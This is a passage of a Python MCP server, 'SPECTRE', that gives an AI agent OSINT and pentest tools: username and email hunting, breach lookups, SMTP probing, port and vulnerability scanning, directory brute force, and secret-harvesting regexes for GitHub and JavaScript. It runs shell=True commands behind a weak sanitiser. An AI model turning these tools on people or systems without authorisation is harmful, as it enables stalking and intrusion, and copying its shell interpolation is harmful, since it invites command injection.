#!/usr/bin/env python3
"""
███████╗██████╗ ███████╗ ██████╗████████╗██████╗ ███████╗
██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝
███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝█████╗
╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██╔══╝
███████║██║     ███████╗╚██████╗   ██║   ██║  ██║███████╗
╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝

SPECTRE — Surveillance, Penetration, Exploitation & Cyber Threat
           Reconnaissance Engine

Combined OSINT + Pentest MCP Server
Every surveillance and exploitation tool. One unified interface.
"""

import subprocess
import shlex
import sys
import os
import re
import json
import logging
import tempfile

try:
    from mcp.server.fastmcp import FastMCP
except ImportError:
    import subprocess
    import sys
    print("[WARNING] MCP SDK not found. Attempting to install...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "mcp[cli]", "fastmcp"])
        from mcp.server.fastmcp import FastMCP
    except Exception as e:
        print(f"[CRITICAL] Failed to install MCP SDK: {e}")
        print("Please run: pip install mcp[cli] fastmcp")
        sys.exit(1)

# ─────────────────────────────────────────────────────────────────────────────
# BOOTSTRAP
# ─────────────────────────────────────────────────────────────────────────────

logging.basicConfig(
    stream=sys.stderr,
    level=logging.INFO,
    format="%(asctime)s [SPECTRE] %(levelname)s %(message)s",
)
log = logging.getLogger("spectre")

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURATION  (all tuneable via environment variables)
# ─────────────────────────────────────────────────────────────────────────────

HOST        = os.environ.get("MCP_HOST",       "0.0.0.0")
PORT        = int(os.environ.get("MCP_PORT",   "8001"))
TRANSPORT   = os.environ.get("MCP_TRANSPORT",  "sse")
TIMEOUT     = int(os.environ.get("TOOL_TIMEOUT", "300"))
PYTHON      = os.environ.get("SPECTRE_PYTHON", "/opt/mcp-venv/bin/python3")
WORDLIST    = os.environ.get("SPECTRE_WORDLIST", "/usr/share/wordlists/dirb/common.txt")

# Optional API keys (can also be supplied per-tool call)
SHODAN_API_KEY   = os.environ.get("SHODAN_API_KEY",   "")
VT_API_KEY       = os.environ.get("VT_API_KEY",       "")
ABUSEIPDB_KEY    = os.environ.get("ABUSEIPDB_KEY",    "")
ETHERSCAN_KEY    = os.environ.get("ETHERSCAN_KEY",    "")

mcp = FastMCP("spectre", host=HOST, port=PORT)


# ─────────────────────────────────────────────────────────────────────────────
# CORE HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def run(cmd: str, timeout: int = TIMEOUT) -> str:
    """Execute a shell command string; return combined stdout/stderr."""
    log.info("EXEC: %s", cmd[:200])
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        out = r.stdout.strip()
        err = r.stderr.strip()
        if out and err:
            return out + "\n[STDERR]\n" + err
        return out or err or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] {timeout}s exceeded"
    except Exception as exc:
        return f"[ERROR] {exc}"


def run_argv(cmd: list, timeout: int = TIMEOUT) -> str:
    """Execute a pre-split argument list; return combined stdout/stderr."""
    log.info("EXEC: %s", " ".join(str(c) for c in cmd[:10]))
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        out = r.stdout.strip()
        err = r.stderr.strip()
        if r.returncode not in (0, 1) and not out:
            out = f"[Exit {r.returncode}]"
        if out and err:
            return out + "\n[STDERR]\n" + err
        return out or err or "(no output)"
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] {timeout}s exceeded"
    except FileNotFoundError as exc:
        return f"[ERROR] Tool not found: {exc}"
    except Exception as exc:
        return f"[ERROR] {exc}"


def san(value: str) -> str:
    """Sanitise a user-supplied string for shell interpolation."""
    return re.sub(r"[;&|`$<>\\]", "", str(value)).strip()


def split_opts(s: str) -> list:
    """Safely split an options string into a list."""
    if not s:
        return []
    try:
        return shlex.split(s)
    except ValueError:
        return s.split()


def require(*values) -> str | None:
    """Return an error string if any value is empty, else None."""
    for v in values:
        if not str(v).strip():
            return "[ERROR] one or more required parameters are missing"
    return None


# ═════════════════════════════════════════════════════════════════════════════
# ██████╗  ██████╗     OSINT MODULE
# ██╔══██╗██╔════╝
# ██████╔╝██║
# ██╔══██╗██║
# ██║  ██║╚██████╗
# ╚═╝  ╚═╝ ╚═════╝
# ═════════════════════════════════════════════════════════════════════════════

# ─── IDENTITY & PEOPLE ───────────────────────────────────────────────────────

@mcp.tool()
def sherlock_username(username: str) -> str:
    """Hunt a username across 400+ social networks simultaneously."""
    if err := require(username): return err
    u = san(username)
    return run(
        f"{PYTHON} -m sherlock {u} --print-found --timeout 10 2>/dev/null "
        f"|| sherlock {u} --print-found --timeout 10",
        timeout=300,
    )


@mcp.tool()
def maigret_username(username: str, sites: str = "") -> str:
    """Deep username recon across 3000+ sites with Maigret."""
    if err := require(username): return err
    u = san(username)
    sf = f"--site {san(sites)}" if sites else ""
    return run(f"{PYTHON} -m maigret {u} {sf} 2>/dev/null", timeout=300)


@mcp.tool()
def holehe_email(email: str) -> str:
    """Check if an email is registered on 120+ websites (Facebook, Twitter, etc.)."""
    if err := require(email): return err
    return run(f"{PYTHON} -m holehe {san(email)} --only-used 2>/dev/null", timeout=180)


@mcp.tool()
def h8mail_breach(target: str, breach_file: str = "") -> str:
    """Search email/username against breach databases and leaked credentials."""
    if err := require(target): return err
    t = san(target)
    bf = f"-bc {san(breach_file)}" if breach_file else ""
    return run(f"{PYTHON} -m h8mail -t {t} {bf} 2>/dev/null", timeout=180)


@mcp.tool()
def socialscan_check(query: str) -> str:
    """Check email/username availability across social platforms."""
    if err := require(query): return err
    return run(f"{PYTHON} -m socialscan {san(query)} 2>/dev/null", timeout=60)


@mcp.tool()
def phoneinfoga_scan(phone: str) -> str:
    """International phone number intelligence — carrier, country, line type, reputation.
    Provide phone in E.164 format, e.g. +12025551234"""
    if err := require(phone): return err
    p = san(phone)
    return run(
        f"phoneinfoga scan -n '{p}' 2>/dev/null "
        f"|| {PYTHON} -m phoneinfoga scan -n '{p}' 2>/dev/null",
        timeout=120,
    )


@mcp.tool()
def osrf_usufy(username: str, platforms: str = "") -> str:
    """OSRFramework usufy — check username across configured platforms."""
    if err := require(username): return err
    u = san(username)
    pf = f"-p {san(platforms)}" if platforms else ""
    return run(f"usufy -n {u} {pf} 2>/dev/null", timeout=180)


@mcp.tool()
def osrf_mailfy(email: str) -> str:
    """OSRFramework mailfy — check if email exists on 20+ platforms."""
    if err := require(email): return err
    return run(f"mailfy -n {san(email)} 2>/dev/null", timeout=180)


@mcp.tool()
def osrf_searchfy(query: str) -> str:
    """OSRFramework searchfy — search people/entities across search engines."""
    if err := require(query): return err
    return run(f"searchfy -q '{san(query)}' 2>/dev/null", timeout=180)


# ─── EMAIL INTELLIGENCE ──────────────────────────────────────────────────────

@mcp.tool()
def email_harvest(domain: str, sources: str = "all") -> str:
    """Harvest all emails associated with a domain via Google, Bing, LinkedIn, etc."""
    if err := require(domain): return err
    return run(
        f"theHarvester -d {san(domain)} -b {san(sources)} -l 1000 2>/dev/null",
        timeout=300,
    )


@mcp.tool()
def email_verify(email: str) -> str:
    """Verify if an email address is valid and reachable via SMTP probing."""
    if err := require(email): return err
    e = san(email)
    script = (
        "import smtplib, dns.resolver\n"
        f"domain = '{e}'.split('@')[1]\n"
        "try:\n"
        "    mx = str(dns.resolver.resolve(domain, 'MX')[0].exchange)\n"
        "    smtp = smtplib.SMTP(timeout=10)\n"
        "    smtp.connect(mx)\n"
        "    smtp.helo('test.com')\n"
        "    smtp.mail('test@test.com')\n"
        f"    code, msg = smtp.rcpt('{e}')\n"
        "    print('VALID' if code == 250 else f'INVALID: {code} {msg}')\n"
        "    smtp.quit()\n"
        "except Exception as ex:\n"
        "    print(f'ERROR: {ex}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"python3 {tmp}", timeout=30)
    os.unlink(tmp)
    return result


@mcp.tool()
def ghunt_google(email: str) -> str:
    """GHunt — deep Google account investigation (profile, maps, photos, calendar)."""
    if err := require(email): return err
    return run(f"{PYTHON} -m ghunt email {san(email)} 2>/dev/null", timeout=120)


@mcp.tool()
def hibp_check(email: str) -> str:
    """Check HaveIBeenPwned — find which data breaches an email appears in."""
    if err := require(email): return err
    e = san(email)
    return run(
        f"curl -sA 'SPECTRE-OSINT' 'https://haveibeenpwned.com/api/v3/breachedaccount/{e}' 2>/dev/null "
        f"|| echo 'HIBP v3 requires an API key — see https://haveibeenpwned.com/API/Key'",
        timeout=30,
    )


# ─── SOCIAL MEDIA INTELLIGENCE (SOCMINT) ─────────────────────────────────────

@mcp.tool()
def linkedin_search(query: str) -> str:
    """Search LinkedIn profiles via Google dork."""
    if err := require(query): return err
    q = san(query)
    return run(
        f"curl -sA 'Mozilla/5.0' 'https://www.google.com/search?q=site:linkedin.com+\"{q}\"' 2>/dev/null "
        r"| python3 -c \"import sys,re; d=sys.stdin.read(); "
        r"links=re.findall(r'https://www\.linkedin\.com/in/[a-zA-Z0-9\-]+', d); "
        r"[print(l) for l in set(links)]\"",
        timeout=30,
    )


@mcp.tool()
def reddit_user(username: str) -> str:
    """Investigate Reddit user — posts, comments, karma, account age."""
    if err := require(username): return err
    u = san(username)
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://www.reddit.com/user/{u}/about.json' 2>/dev/null "
        f"| python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def reddit_search(query: str, subreddit: str = "") -> str:
    """Search Reddit for a query, optionally scoped to a subreddit."""
    if err := require(query): return err
    q = san(query).replace(" ", "+")
    sr = f"r/{san(subreddit)}/" if subreddit else ""
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://www.reddit.com/{sr}search.json?q={q}&limit=25' 2>/dev/null "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"[print(p['data']['title'],'\n  URL:',p['data']['url'],'\n  Author:',p['data']['author']) "
        r"for p in d['data']['children']]\"",
        timeout=30,
    )


@mcp.tool()
def github_user(username: str) -> str:
    """Investigate GitHub user — repos, gists, email, org, contributions."""
    if err := require(username): return err
    u = san(username)
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://api.github.com/users/{u}' | python3 -m json.tool && "
        f"echo '\\n--- REPOS ---' && "
        f"curl -sA 'SPECTRE/1.0' 'https://api.github.com/users/{u}/repos?per_page=30' "
        r"| python3 -c \"import sys,json; [print(r['name'], r.get('description',''), r.get('language','')) "
        r"for r in json.load(sys.stdin)]\"",
        timeout=30,
    )


@mcp.tool()
def github_email_leak(username: str) -> str:
    """Extract email addresses leaked in GitHub commit events."""
    if err := require(username): return err
    u = san(username)
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://api.github.com/users/{u}/events/public' "
        r"| python3 -c \"import sys,json,re; data=json.load(sys.stdin); text=json.dumps(data); "
        r"emails=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text); "
        r"[print(e) for e in set(emails) if 'noreply' not in e]\"",
        timeout=30,
    )


@mcp.tool()
def github_dork(query: str) -> str:
    """Search GitHub for exposed credentials, API keys, and secrets."""
    if err := require(query): return err
    q = san(query).replace(" ", "+")
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://api.github.com/search/code?q={q}&per_page=10' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"[print(i['html_url'],'\n  Repo:',i['repository']['full_name']) for i in d.get('items',[])]\"",
        timeout=30,
    )


@mcp.tool()
def github_secrets(repo: str) -> str:
    """Clone a GitHub repo and search for hardcoded secrets/credentials."""
    if err := require(repo): return err
    r = san(repo)
    safe_name = r.replace("/", "_")
    return run(
        f"cd /tmp && git clone --depth=1 https://github.com/{r}.git repo_{safe_name} 2>/dev/null && "
        f"grep -rE '(password|passwd|api_key|apikey|secret|token|auth|bearer|aws_access|stripe_key|private_key)"
        r"\s*[=:]\s*[\"'][A-Za-z0-9+/=_\-]{8,}'"
        f" /tmp/repo_{safe_name} 2>/dev/null | head -30",
        timeout=120,
    )


@mcp.tool()
def telegram_search(query: str) -> str:
    """Search Telegram public groups, channels, and users."""
    if err := require(query): return err
    q = san(query).replace(" ", "%20")
    return run(
        f"curl -sA 'SPECTRE/1.0' 'https://telegram.me/s/{q}' 2>/dev/null "
        r"| grep -oP '(?<=tgme_widget_message_text\">)[^<]+' | head -20 "
        f"|| echo 'Direct URL: https://telegram.me/s/{q}'",
        timeout=30,
    )


# ─── DOMAIN & IP INTELLIGENCE ────────────────────────────────────────────────

@mcp.tool()
def whois_lookup(target: str) -> str:
    """WHOIS domain/IP lookup — registrar, owner, dates, nameservers."""
    if err := require(target): return err
    return run(f"whois {san(target)}")


@mcp.tool()
def dns_lookup(target: str, record_type: str = "ANY") -> str:
    """DNS record lookup — A, MX, NS, TXT, CNAME, SOA, AAAA, or ANY."""
    if err := require(target): return err
    return run(f"dig {san(target)} {san(record_type)} +noall +answer +authority +additional")


@mcp.tool()
def reverse_dns(ip: str) -> str:
    """Reverse DNS — find the hostname behind an IP address."""
    if err := require(ip): return err
    i = san(ip)
    return run(f"dig -x {i} +short && host {i}")


@mcp.tool()
def ip_info(ip: str) -> str:
    """Full IP intelligence — ASN, org, country, city, ISP, abuse contact."""
    if err := require(ip): return err
    i = san(ip)
    return run(
        f"curl -s 'https://ipinfo.io/{i}/json' | python3 -m json.tool && "
        f"curl -s 'https://ipapi.co/{i}/json/?fields=66846719' | python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def ip_geolocate(ip: str) -> str:
    """Geolocate an IP address — city, country, coordinates, ISP."""
    if err := require(ip): return err
    i = san(ip)
    return run(
        f"curl -s 'https://ipinfo.io/{i}/json' | python3 -m json.tool && "
        f"curl -s 'https://ip-api.com/json/{i}?fields=66846719' | python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def asn_lookup(asn: str) -> str:
    """ASN lookup — find all IP ranges owned by an organisation. (e.g. AS15169)"""
    if err := require(asn): return err
    a = san(asn).upper().lstrip("AS")
    return run(
        f"curl -s 'https://ipinfo.io/AS{a}/json' | python3 -m json.tool && "
        f"whois -h whois.radb.net -- '-i origin AS{a}' 2>/dev/null | grep ^route | head -30",
        timeout=30,
    )


@mcp.tool()
def cert_transparency(domain: str) -> str:
    """Certificate Transparency logs — find all SSL certs ever issued for a domain."""
    if err := require(domain): return err
    d = san(domain)
    return run(
        f"curl -s 'https://crt.sh/?q=%.{d}&output=json' 2>/dev/null "
        r"| python3 -c \"import sys,json; certs=json.load(sys.stdin); "
        r"[print(c['name_value']) for c in certs[:50]]\" | sort -u",
        timeout=30,
    )


@mcp.tool()
def subfinder_enum(domain: str) -> str:
    """Passive subdomain enumeration using 50+ public sources (subfinder)."""
    if err := require(domain): return err
    return run(f"subfinder -d {san(domain)} -silent 2>/dev/null", timeout=180)


@mcp.tool()
def amass_enum(domain: str, passive: str = "true") -> str:
    """Comprehensive subdomain enumeration with OWASP Amass."""
    if err := require(domain): return err
    pf = "-passive" if passive.lower() == "true" else ""
    return run(f"amass enum {pf} -d {san(domain)}", timeout=300)


@mcp.tool()
def dnsx_resolve(domain: str, wordlist: str = "") -> str:
    """Fast DNS resolution and subdomain brute force with dnsx."""
    if err := require(domain): return err
    d = san(domain)
    wl = san(wordlist) if wordlist else "/usr/share/wordlists/dirb/small.txt"
    return run(
        f"cat {wl} | awk '{{print $1\".{d}\"}}' | dnsx -silent -resp 2>/dev/null | head -50",
        timeout=180,
    )


@mcp.tool()
def shodan_host(ip: str, api_key: str = "") -> str:
    """Shodan host lookup — open ports, services, vulnerabilities for an IP.
    Falls back to Shodan InternetDB (no key required) when no key is provided."""
    if err := require(ip): return err
    i = san(ip)
    ak = san(api_key) if api_key else SHODAN_API_KEY
    if not ak:
        return run(
            f"curl -s 'https://internetdb.shodan.io/{i}' | python3 -m json.tool",
            timeout=30,
        )
    return run(
        f"{PYTHON} -c \"import shodan,json; api=shodan.Shodan('{ak}'); "
        f"h=api.host('{i}'); print(json.dumps(h,indent=2,default=str))\" 2>/dev/null",
        timeout=60,
    )


@mcp.tool()
def shodan_search(query: str, options: str = "") -> str:
    """Search Shodan for internet-exposed assets matching a query string."""
    if err := require(query): return err
    return run_argv(["shodan", "search"] + split_opts(options) + [query])


@mcp.tool()
def censys_query(query: str) -> str:
    """Query Censys for exposed services and certificates."""
    if err := require(query): return err
    q = san(query)
    return run(
        f"curl -s 'https://search.censys.io/api/v2/hosts/search?q={q}&per_page=10' "
        f"-H 'Accept: application/json' 2>/dev/null | python3 -m json.tool "
        f"|| echo 'Censys API credentials needed — set CENSYS_API_ID and CENSYS_API_SECRET'",
        timeout=30,
    )


@mcp.tool()
def wayback_urls(domain: str, limit: str = "1000") -> str:
    """Wayback Machine — retrieve all URLs ever archived for a domain."""
    if err := require(domain): return err
    d = san(domain)
    l = san(limit)
    return run(
        f"waybackurls {d} 2>/dev/null | head -{l} || "
        f"curl -s 'http://web.archive.org/cdx/search/cdx?url=*.{d}/*&output=text&fl=original&collapse=urlkey&limit={l}' 2>/dev/null",
        timeout=120,
    )


@mcp.tool()
def gau_urls(domain: str) -> str:
    """Get All URLs — fetch known URLs from Wayback, OTX, Common Crawl, URLScan."""
    if err := require(domain): return err
    return run(f"gau {san(domain)} 2>/dev/null | head -200", timeout=120)


@mcp.tool()
def urlscan_lookup(domain: str) -> str:
    """URLScan.io — find all scans of a domain, screenshots, technologies."""
    if err := require(domain): return err
    d = san(domain)
    return run(
        f"curl -s 'https://urlscan.io/api/v1/search/?q=domain:{d}&size=10' "
        r"| python3 -c \"import sys,json; d=json.load(sys.stdin); "
        r"[print(r['page']['url'],'\n  IP:',r['page'].get('ip','?'),'\n  Server:',r['page'].get('server','?')) "
        r"for r in d.get('results',[])]\"",
        timeout=30,
    )


@mcp.tool()
def virustotal_domain(domain: str, api_key: str = "") -> str:
    """VirusTotal domain report — malware detections, categories, subdomains."""
    if err := require(domain): return err
    d = san(domain)
    ak = san(api_key) if api_key else VT_API_KEY
    if not ak:
        return "[ERROR] VirusTotal API key required — set VT_API_KEY env var or pass api_key"
    return run(
        f"curl -s 'https://www.virustotal.com/api/v3/domains/{d}' -H 'x-apikey: {ak}' | python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def virustotal_ip(ip: str, api_key: str = "") -> str:
    """VirusTotal IP report — reputation, detected URLs, communicating samples."""
    if err := require(ip): return err
    i = san(ip)
    ak = san(api_key) if api_key else VT_API_KEY
    if not ak:
        return "[ERROR] VirusTotal API key required — set VT_API_KEY env var or pass api_key"
    return run(
        f"curl -s 'https://www.virustotal.com/api/v3/ip_addresses/{i}' -H 'x-apikey: {ak}' | python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def threatfox_lookup(ioc: str) -> str:
    """ThreatFox — check if an IP/domain/hash is a known malware indicator."""
    if err := require(ioc): return err
    payload = json.dumps({"query": "search_ioc", "search_term": san(ioc)})
    return run(
        f"curl -s -X POST 'https://threatfox-api.abuse.ch/api/v1/' -d '{payload}' | python3 -m json.tool",
        timeout=30,
    )


@mcp.tool()
def abuseipdb_check(ip: str, api_key: str = "") -> str:
    """AbuseIPDB — check if an IP has been reported for malicious activity."""
    if err := require(ip): return err
    i = san(ip)
    ak = san(api_key) if api_key else ABUSEIPDB_KEY
    if not ak:
        return "[ERROR] AbuseIPDB API key required — set ABUSEIPDB_KEY env var or pass api_key"
    return run(
        f"curl -s 'https://api.abuseipdb.com/api/v2/check?ipAddress={i}&maxAgeInDays=90&verbose' "
        f"-H 'Key: {ak}' -H 'Accept: application/json' | python3 -m json.tool",
        timeout=30,
    )


# ─── NETWORK & PORT INTELLIGENCE ─────────────────────────────────────────────

@mcp.tool()
def nmap_scan(target: str, flags: str = "-sV -sC -T4 --open") -> str:
    """Nmap port scan with service/version detection."""
    if err := require(target): return err
    return run(f"sudo nmap {san(flags)} {san(target)}")


@mcp.tool()
def nmap_vuln(target: str, ports: str = "") -> str:
    """Nmap vulnerability scripts scan — detects known CVEs."""
    if err := require(target): return err
    p = f"-p {san(ports)}" if ports else ""
    return run(f"sudo nmap --script vuln {p} {san(target)}", timeout=900)


@mcp.tool()
def nmap_full(target: str) -> str:
    """Full nmap — all 65535 ports, OS detection, version, scripts."""
    if err := require(target): return err
    return run(
        f"sudo nmap -sV -sC -O -A -p- --min-rate 2000 {san(target)}",
        timeout=1200,
    )


@mcp.tool()
def nmap_udp_scan(target: str, options: str = "") -> str:
    """Nmap UDP scan on the top 200 UDP ports of a target."""
    if err := require(target): return err
    return run_argv(
        ["nmap", "-sU", "--top-ports", "200", "-T4"] + split_opts(options) + [san(target)],
        timeout=900,
    )


@mcp.tool()
def masscan_scan(target: str, ports: str = "1-65535", rate: str = "5000") -> str:
    """Masscan — world's fastest port scanner."""
    if err := require(target): return err
    return run(
        f"sudo masscan {san(target)} -p{san(ports)} --rate {san(rate)}"
    )


@mcp.tool()
def naabu_scan(target: str, ports: str = "") -> str:
    """Naabu — fast port scanner with service discovery."""
    if err := require(target): return err
    p = f"-p {san(ports)}" if ports else "-top-ports 1000"
    return run(f"naabu -host {san(target)} {p} -silent 2>/dev/null", timeout=120)


@mcp.tool()
def httpx_probe(targets: str) -> str:
    """Httpx — probe HTTP/HTTPS services: status codes, titles, tech stack.
    Pass comma-separated targets or a single host."""
    if err := require(targets): return err
    t = san(targets).replace(",", "\n")
    return run(
        f"echo '{t}' | httpx -silent -title -status-code -tech-detect -server -content-length 2>/dev/null",
        timeout=120,
    )


@mcp.tool()
def tlsx_scan(target: str) -> str:
    """TLS fingerprinting — cipher suites, certificates, JA3 fingerprint."""
    if err := require(target): return err
    return run(
        f"tlsx -host {san(target)} -json 2>/dev/null | python3 -m json.tool",
        timeout=60,
    )


@mcp.tool()
def traceroute_host(target: str, options: str = "") -> str:
    """Trace the network path to a target."""
    if err := require(target): return err
    return run_argv(["traceroute"] + split_opts(options) + [san(target)], timeout=60)


@mcp.tool()
def ping_sweep(network: str) -> str:
    """Ping sweep a CIDR range to discover live hosts. e.g. 192.168.1.0/24"""
    if err := require(network): return err
    return run(
        f"sudo nmap -sn {san(network)} --open 2>/dev/null | grep 'Nmap scan report'"
    )


@mcp.tool()
def arp_scan(network: str = "192.168.1.0/24") -> str:
    """ARP scan — discover all devices on the local network."""
    return run(f"sudo arp-scan {san(network)}")


# ─── WEB APPLICATION INTELLIGENCE ────────────────────────────────────────────

@mcp.tool()
def whatweb_scan(target: str, aggression: str = "3") -> str:
    """WhatWeb — identify CMS, frameworks, server, analytics, widgets."""
    if err := require(target): return err
    return run(f"whatweb -a {san(aggression)} {san(target)}")


@mcp.tool()
def wafw00f_scan(target: str, options: str = "") -> str:
    """WAF detection — identify what firewall is protecting a site."""
    if err := require(target): return err
    return run_argv(["wafw00f"] + split_opts(options) + [san(target)])


@mcp.tool()
def nikto_scan(target: str, flags: str = "") -> str:
    """Nikto — web server vulnerability and misconfiguration scanner."""
    if err := require(target): return err
    return run(f"nikto -h {san(target)} {san(flags)}", timeout=300)


@mcp.tool()
def nuclei_scan(target: str, templates: str = "", options: str = "-severity critical,high,medium") -> str:
    """Nuclei — vulnerability scanner with 6000+ templates.
    Optionally specify a template path; defaults to automatic scan."""
    if err := require(target): return err
    t = f"-t {san(templates)}" if templates else "-automatic-scan"
    return run(
        f"nuclei -u {san(target)} {t} {san(options)} -silent 2>/dev/null",
        timeout=600,
    )


@mcp.tool()
def nuclei_cve_scan(target: str, cve: str = "") -> str:
    """Run Nuclei CVE templates against a target."""
    if err := require(target): return err
    t = san(target)
    c = f"-t cves/{san(cve)}.yaml" if cve else "-t cves/"
    return run(f"nuclei -u {t} {c} -silent 2>/dev/null", timeout=300)


@mcp.tool()
def gobuster_dir(target: str, wordlist: str = "", extensions: str = "php,html,js,txt,json,xml,bak,zip") -> str:
    """Gobuster — directory and file brute force."""
    if err := require(target): return err
    wl = san(wordlist) if wordlist else WORDLIST
    return run(
        f"gobuster dir -u {san(target)} -w {wl} -x {san(extensions)} -q --no-error 2>/dev/null",
        timeout=300,
    )


@mcp.tool()
def ffuf_fuzz(target: str, wordlist: str = "", options: str = "") -> str:
    """FFUF — web fuzzer for directories, params, virtual hosts.
    Place FUZZ in the URL; if absent it is appended automatically."""
    if err := require(target): return err
    t = san(target)
    url = t if "FUZZ" in t else t + "/FUZZ"
    wl = san(wordlist) if wordlist else WORDLIST
    return run_argv(
        ["ffuf", "-u", url, "-w", wl, "-mc", "200,201,204,301,302,307,401,403,405", "-s"]
        + split_opts(options),
        timeout=300,
    )


@mcp.tool()
def katana_crawl(target: str, depth: str = "3") -> str:
    """Katana — next-gen web crawler with JavaScript parsing."""
    if err := require(target): return err
    return run(
        f"katana -u {san(target)} -d {san(depth)} -silent -jc 2>/dev/null | head -100",
        timeout=300,
    )


@mcp.tool()
def sslscan_check(target: str, options: str = "") -> str:
    """SSLScan — enumerate SSL/TLS ciphers, protocols, certificates."""
    if err := require(target): return err
    return run_argv(["sslscan"] + split_opts(options) + [san(target)])


@mcp.tool()
def testssl_run(target: str, options: str = "") -> str:
    """Check SSL/TLS weaknesses including BEAST, POODLE, Heartbleed. Format: host:port"""
    if err := require(target): return err
    return run_argv(["testssl.sh"] + split_opts(options) + [san(target)], timeout=300)


@mcp.tool()
def headers_security(target: str) -> str:
    """Analyse HTTP security headers — CSP, HSTS, X-Frame, and more."""
    if err := require(target): return err
    t = san(target)
    return run(
        f"curl -s -I -L {t} 2>/dev/null "
        f"| grep -iE 'strict-transport|content-security|x-frame|x-xss|x-content|referrer-policy|permissions-policy|server:|x-powered'",
        timeout=30,
    )


@mcp.tool()
def js_secrets(target: str) -> str:
    """Extract secrets and API keys from JavaScript files on a target."""
    if err := require(target): return err
    t = san(target)
    pattern = r"""(api_key|apikey|secret|password|token|auth|bearer|private_key|aws_|stripe_).*[=:]\s*["'][A-Za-z0-9+/=_\-]{8,}"""
    return run(
        f"curl -s {t} 2>/dev/null "
        r"| grep -oP '(src|href)=\"[^\"]*\.js[^\"]*\"' "
        r"| grep -oP '(?<=\")[^\"]+' "
        r"| while read js; do curl -s \"$js\" 2>/dev/null; done "
        f"| grep -iE '{pattern}' | head -20",
        timeout=60,
    )


# ─── WEB SCRAPING (SCRAPLING) ────────────────────────────────────────────────

@mcp.tool()
def scrapling_fetch(url: str, mode: str = "fetcher") -> str:
    """Fetch a webpage's content.
    mode: 'fetcher' (fast), 'dynamic' (renders JS), or 'stealth' (bypasses anti-bot)."""
    if err := require(url): return err
    u = san(url)
    m = san(mode).lower()
    fetcher_map = {
        "fetcher": "Fetcher.get",
        "dynamic": "DynamicFetcher.fetch",
        "stealth": "StealthyFetcher.fetch"
    }
    call = fetcher_map.get(m, "Fetcher.get")
    kwargs = ", headless=True, network_idle=True" if m != "fetcher" else ""
    
    script = (
        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
        "try:\n"
        f"    page = {call}('{u}'{kwargs})\n"
        f"    print(f'STATUS: {{page.status if hasattr(page, \"status\") else page.status_code}}')\n"
        "    print(page.text)\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_extract(url: str, selector: str, selector_type: str = "css", 
                        mode: str = "fetcher", adaptive: bool = False) -> str:
    """Extract data from a page using CSS or XPath selectors.
    selector_type: 'css' or 'xpath'.
    mode: 'fetcher', 'dynamic', or 'stealth'.
    adaptive=True: uses similarity matching if the selector fails."""
    if err := require(url, selector): return err
    u = san(url)
    s = san(selector)
    st = "css" if selector_type.lower() == "css" else "xpath"
    m = san(mode).lower()
    adapt = "True" if adaptive else "False"
    
    fetcher_map = {
        "fetcher": "Fetcher.get",
        "dynamic": "DynamicFetcher.fetch",
        "stealth": "StealthyFetcher.fetch"
    }
    call = fetcher_map.get(m, "Fetcher.get")
    kwargs = ", headless=True, network_idle=True" if m != "fetcher" else ""
    
    script = (
        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
        "try:\n"
        f"    page = {call}('{u}'{kwargs})\n"
        f"    elements = getattr(page, '{st}')('{s}', adaptive={adapt})\n"
        "    for e in elements:\n"
        "        print(e.get())\n"
        "except Exception as e:\n"
        "    print(f'[ERROR] {e}')\n"
    )
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(script)
        tmp = f.name
    result = run(f"{PYTHON} {tmp}", timeout=120)
    os.unlink(tmp)
    return result


@mcp.tool()
def scrapling_extract_patterns(url: str, patterns: list, mode: str = "fetcher") -> str:
    """Extract specific information using regex patterns or predefined keywords.
    patterns: list of strings (regex or keywords)."""
    if err := require(url, patterns): return err
    u = san(url)
    m = san(mode).lower()
    
    fetcher_map = {
        "fetcher": "Fetcher.get",
        "dynamic": "DynamicFetcher.fetch",
        "stealth": "StealthyFetcher.fetch"
    }
    call = fetcher_map.get(m, "Fetcher.get")
    kwargs = ", headless=True, network_idle=True" if m != "fetcher" else ""
    
    # Safely format patterns for the script
    p_str = json.dumps(patterns)
    
    script = (
        "from scrapling.fetchers import Fetcher, DynamicFetcher, StealthyFetcher\n"
        "import re\n"
        "try:\n"
        f"    page = {call}('{u}'{kwargs})\n"
        f"    patterns = {p_str}\n"
        "    results = {}\n"
        "    for p in patterns:\n"
        "        matches = re.findall(p, page.text)\n"
        "        results[p] = list(set(matches))\n"
        "    import json\n"
        "    print(json.dumps(results, indent=2))\n"
        "except Exception as e:\n"
